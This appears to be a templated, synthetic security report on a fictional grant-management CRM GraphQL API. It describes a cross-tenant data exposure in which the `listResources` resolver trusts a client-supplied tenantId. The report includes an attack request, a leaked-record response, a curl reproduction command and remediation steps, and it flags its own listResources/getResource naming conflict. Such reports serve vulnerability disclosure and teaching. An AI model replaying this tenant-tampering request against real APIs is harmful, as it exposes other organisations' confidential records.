# Security Analysis Report
**System:** GrantFlow CRM API
**Domain:** Non-Profit / Grant Management CRM
**Example ID:** GQL-0277
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Insecure Design — Pattern 3.3 | Semantic ambiguity / over-broad endpoint on `getResource` / `listResources` — attacker accesses grant CRM records via ambiguously-scoped resolver |

---

## Finding 1 — Insecure Design: Semantic Ambiguity (Over-Broad Endpoint) (Pattern 3.3)

### Summary
The GraphQL API at `https://api.grantflow-crm-api.example.com/graphql` exposes a `listResources` resolver that is semantically over-broad — it accepts a client-supplied `tenantId` filter without JWT-level validation, causing it to function as a cross-tenant enumeration endpoint. The resolver returns grant records belonging to `tenant-3908` without verifying the caller's JWT `tenantId` claim matches.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-3908")` while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-8a933908` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 3.3 — Semantic ambiguity (over-broad endpoints) (Insecure Design)
**Affected endpoint:** `POST https://api.grantflow-crm-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.grantflow-crm-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listResources(tenantId: \"tenant-3908\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim Grant CRM Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-3908",
      "ownerId": "other-user-8a933908",
      "data": {
        "sensitiveField": "CONFIDENTIAL-8a933908",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.grantflow-crm-api.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-3908\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-3908, sensitiveField: CONFIDENTIAL-8a933908
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listResources` must inject `tenantId` from JWT server-side — never accept it as a client argument.
2. Resolver must be narrowed in scope: define separate resolvers for different resource categories rather than one over-broad `listResources`.
3. Redis cache key must include tenant dimension.
